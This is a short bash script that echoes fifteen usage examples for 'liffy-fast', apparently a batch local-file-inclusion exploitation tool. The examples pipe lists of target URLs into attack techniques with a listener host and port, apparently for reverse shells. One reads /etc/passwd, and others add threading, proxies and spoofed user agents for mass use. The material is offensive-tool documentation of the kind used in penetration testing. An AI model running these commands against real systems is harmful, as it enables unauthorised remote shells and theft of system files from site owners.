#!/bin/bash
"""
Batch Processing Examples for Liffy Fast Testing
"""

# Example 1: Basic batch processing
echo "Example 1: Basic batch processing"
echo "cat urls.txt | liffy-fast data --batch --lhost 192.168.1.100 --lport 4444"

# Example 2: Batch processing with parallel execution
echo "Example 2: Batch processing with parallel execution"
echo "cat urls.txt | liffy-fast data --batch --parallel --lhost 192.168.1.100 --lport 4444"

# Example 3: Batch processing with auto IP detection
echo "Example 3: Batch processing with auto IP detection"
echo "cat urls.txt | liffy-fast data --batch --auto-ip --auto-port"

# Example 4: Batch processing with filter technique
echo "Example 4: Batch processing with filter technique"
echo "cat urls.txt | liffy-fast filter --batch --file '/etc/passwd'"

# Example 5: Batch processing with JSON output
echo "Example 5: Batch processing with JSON output"
echo "cat urls.txt | liffy-fast data --batch --json --lhost 192.168.1.100 --lport 4444 > results.json"

# Example 6: Batch processing with custom threads
echo "Example 6: Batch processing with custom threads"
echo "cat urls.txt | liffy-fast data --batch --parallel --threads 8 --lhost 192.168.1.100 --lport 4444"

# Example 7: Batch processing with verbose output
echo "Example 7: Batch processing with verbose output"
echo "cat urls.txt | liffy-fast data --batch --verbose --lhost 192.168.1.100 --lport 4444"

# Example 8: Batch processing with different techniques
echo "Example 8: Batch processing with different techniques"
echo "cat urls.txt | liffy-fast auto --batch --auto-ip --auto-port"

# Example 9: Batch processing with file output
echo "Example 9: Batch processing with file output"
echo "cat urls.txt | liffy-fast data --batch --lhost 192.168.1.100 --lport 4444 --output 'liffy_batch_results.log'"

# Example 10: Batch processing with custom parameters
echo "Example 10: Batch processing with custom parameters"
echo "cat urls.txt | liffy-fast data --batch --lhost 192.168.1.100 --lport 4444 --cookies 'session=abc123' --timeout 60"

# Example 11: Batch processing with proxy
echo "Example 11: Batch processing with proxy"
echo "cat urls.txt | liffy-fast data --batch --lhost 192.168.1.100 --lport 4444 --proxy 'http://127.0.0.1:8080'"

# Example 12: Batch processing with different user agents
echo "Example 12: Batch processing with different user agents"
echo "cat urls.txt | liffy-fast data --batch --lhost 192.168.1.100 --lport 4444 --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'"

# Example 13: Batch processing with input technique
echo "Example 13: Batch processing with input technique"
echo "cat urls.txt | liffy-fast input --batch --lhost 192.168.1.100 --lport 4444"

# Example 14: Batch processing with multiple techniques
echo "Example 14: Batch processing with multiple techniques"
echo "for technique in data input filter auto; do"
echo "  cat urls.txt | liffy-fast \$technique --batch --lhost 192.168.1.100 --lport 4444 --output \"liffy_\${technique}_results.log\""
echo "done"

# Example 15: Batch processing with error handling
echo "Example 15: Batch processing with error handling"
echo "cat urls.txt | liffy-fast data --batch --lhost 192.168.1.100 --lport 4444 2>&1 | tee liffy_batch_output.log"